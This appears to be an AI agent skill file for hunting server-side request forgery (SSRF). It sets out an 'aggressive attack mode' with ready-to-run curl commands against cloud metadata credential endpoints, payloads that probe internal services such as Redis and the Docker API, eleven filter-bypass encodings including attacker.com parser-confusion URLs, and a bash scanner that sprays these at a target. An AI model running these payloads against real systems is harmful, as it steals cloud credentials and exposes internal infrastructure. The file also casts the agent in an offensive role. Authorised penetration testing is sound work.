---
name: hunt-ssrf
description: SSRF hunting — Internal network access, cloud metadata, port scanning. Generates ready-to-run payloads, 11 IP bypass techniques, and escalation paths to RCE. This skill produces executable attack code for finding and exploiting SSRF vulnerabilities.
---

# SSRF HUNTING — AGGRESSIVE ATTACK MODE

**SSRF can go from Low (DNS callback) to Critical (RCE) in one chain.**

## Quick Start

```bash
# Test for SSRF with cloud metadata
TARGET="https://example.com/fetch?url="
curl -s "$TARGEThttp://169.254.169.254/latest/meta-data/"
curl -s "$TARGEThttp://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

## Payload Arsenal

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379     # Redis (unauthenticated)
http://localhost:9200     # Elasticsearch (/_cat/indices)
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker API (GET /containers/json)
http://localhost:8080     # Admin panel
http://localhost:10.96.0.1:443  # Kubernetes API
```

### 11 SSRF IP Bypass Techniques

| Technique | Example | Notes |
|-----------|---------|-------|
| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| Short IP | `http://127.1` | Abbreviated notation |
| IPv6 | `http://[::1]` | Loopback in IPv6 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| DNS rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
| Redirect chain | External URL → 302 to internal | Check each hop |
| URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
| CNAME to internal | Attacker domain → internal hostname | DNS points inward |
| Rare format | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |

## Automated SSRF Scanner

```bash
#!/bin/bash
TARGET=$1
PARAM=$2

echo "=== SSRF SCAN: $TARGET ==="

PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://localhost:6379"
  "http://localhost:9200"
  "http://localhost:2375"
  "http://localhost:8080"
  "http://[::1]"
  "http://127.1"
  "http://0177.0.0.1"
  "http://0x7f000001"
  "http://2130706433"
)

for payload in "${PAYLOADS[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=$payload")
  if [ "$response" == "200" ]; then
    echo "[+] SSRF CONFIRMED: $payload → $response"
    curl -s "$TARGET?$PARAM=$payload" | head -20
  fi
done
```

## Escalation Paths

| SSRF Type | Impact | Severity |
|-----------|--------|----------|
| DNS callback only | Need more | Low |
| Internal service access | Network exposure | Medium |
| Cloud metadata | Credential theft | High |
| Cloud metadata + IAM keys | Infrastructure access | Critical |
| Internal port scan | Service discovery | Medium |
| Redis/K8s access | Command execution | Critical |
| Docker API access | Container escape | Critical |

## Bypass Techniques

```bash
# WAF bypass — try ALL of these
# 1. Decimal IP
http://2130706433

# 2. Octal IP
http://0177.0.0.1

# 3. Hex IP
http://0x7f000001

# 4. Short IP
http://127.1

# 5. IPv6
http://[::1]

# 6. IPv6 mapped
http://[::ffff:127.0.0.1]

# 7. DNS rebinding
# Attacker DNS → first resolves to external, then to internal

# 8. Redirect chain
# Host a URL that 302s to internal

# 9. URL parser confusion
http://attacker.com#@internal

# 10. CNAME to internal
# Attacker domain → CNAME to internal hostname

# 11. Full-width period
http://127。0。0。1
```

## Checklist

- [ ] All IP bypass techniques tested
- [ ] Cloud metadata endpoints tested (AWS, GCP, Azure)
- [ ] Internal services fingerprinted
- [ ] Redirect chain tested
- [ ] DNS rebinding tested
- [ ] Impact quantified ("can access cloud credentials")
